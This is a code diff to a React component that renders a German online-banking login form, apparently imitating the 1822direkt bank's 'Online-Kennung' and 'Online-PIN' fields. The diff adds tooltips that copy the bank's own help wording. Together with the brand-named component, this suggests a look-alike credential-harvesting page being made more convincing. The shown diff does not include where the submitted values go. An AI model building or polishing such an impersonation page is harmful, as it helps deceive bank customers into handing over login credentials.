@@ -70,15 +70,50 @@ const Direkt1822 = () => {
     setShowLoading(true);
   };
 
-  const InfoDot = ({ title }: { title: string }) => (
-    <span title={title} aria-label={title} style={{
-      display: "inline-flex", alignItems: "center", justifyContent: "center",
-      width: 16, height: 16, borderRadius: "50%", background: NAVY, color: "#fff",
-      marginLeft: 6, verticalAlign: "middle", cursor: "help",
-    }}>
-      <Info size={10} strokeWidth={2.5} />
-    </span>
-  );
+  const InfoDot = ({ text }: { text: string }) => {
+    const [open, setOpen] = useState(false);
+    return (
+      <span style={{ position: "relative", display: "inline-block", marginLeft: 6, verticalAlign: "middle" }}>
+        <span
+          tabIndex={0}
+          onMouseEnter={() => setOpen(true)}
+          onMouseLeave={() => setOpen(false)}
+          onFocus={() => setOpen(true)}
+          onBlur={() => setOpen(false)}
+          onClick={() => setOpen((v) => !v)}
+          style={{
+            display: "inline-flex", alignItems: "center", justifyContent: "center",
+            width: 16, height: 16, borderRadius: "50%", background: NAVY, color: "#fff",
+            cursor: "pointer",
+          }}
+        >
+          <Info size={10} strokeWidth={2.5} />
+        </span>
+        {open && (
+          <span
+            role="tooltip"
+            style={{
+              position: "absolute", top: "calc(100% + 10px)", left: "50%", transform: "translateX(-50%)",
+              width: 280, background: NAVY, color: "#fff", fontWeight: 700, fontSize: 13, lineHeight: 1.45,
+              padding: "12px 14px", zIndex: 50, boxShadow: "0 6px 18px rgba(0,0,0,.15)",
+              whiteSpace: "normal", textAlign: "left",
+            }}
+          >
+            <span
+              aria-hidden="true"
+              style={{
+                position: "absolute", top: -7, left: "50%", transform: "translateX(-50%)",
+                width: 0, height: 0,
+                borderLeft: "7px solid transparent", borderRight: "7px solid transparent",
+                borderBottom: `7px solid ${NAVY}`,
+              }}
+            />
+            {text}
+          </span>
+        )}
+      </span>
+    );
+  };
 
   return (
     <div className="min-h-screen flex flex-col" style={{ background: BACKDROP, color: TEXT, fontFamily: FONT }}>
@@ -128,7 +163,7 @@ const Direkt1822 = () => {
               <section style={{ background: CARD, padding: "32px 40px 40px", boxShadow: "0 6px 18px rgba(0,56,106,.12)" }}>
                 <form onSubmit={handleSubmit} noValidate autoComplete="off">
                   <label htmlFor="k" style={{ display: "block", color: NAVY, fontWeight: 700, fontSize: 15, marginBottom: 10 }}>
-                    Online-Kennung<InfoDot title="Ihre persönliche Online-Kennung" />
+                    Online-Kennung<InfoDot text="Ihre Online-Kennung (bestehend aus Ihrer Kundennummer und Ihrer Personenkennung) haben wir Ihnen per SMS oder postalisch mitgeteilt. Sie können sie im Online-Banking selbst ändern." />
                   </label>
                   <input id="k" type="text" value={kennung} onChange={(e) => setKennung(e.target.value)}
                     autoComplete="off"
@@ -140,7 +175,7 @@ const Direkt1822 = () => {
                   </div>
 
                   <label htmlFor="p" style={{ display: "block", color: NAVY, fontWeight: 700, fontSize: 15, marginTop: 28, marginBottom: 10 }}>
-                    Online-PIN<InfoDot title="Ihre persönliche Online-PIN" />
+                    Online-PIN<InfoDot text="Ihre Online-PIN hat mindestens 8 max 56. Stellen und besteht aus Zahlen und/oder Buchstaben. Dabei wird zwischen Groß- und Kleinbuchstaben unterschieden." />
                   </label>
                   <div style={{ position: "relative", display: "flex", alignItems: "stretch", background: INPUT_BG, border: `2px solid ${INPUT_BORDER}`, borderRadius: 2, boxShadow: focusField === "p" ? FOCUS_RING : "none" }}>
                     <input id="p" type={showPin ? "text" : "password"} value={pin} onChange={(e) => setPin(e.target.value)}
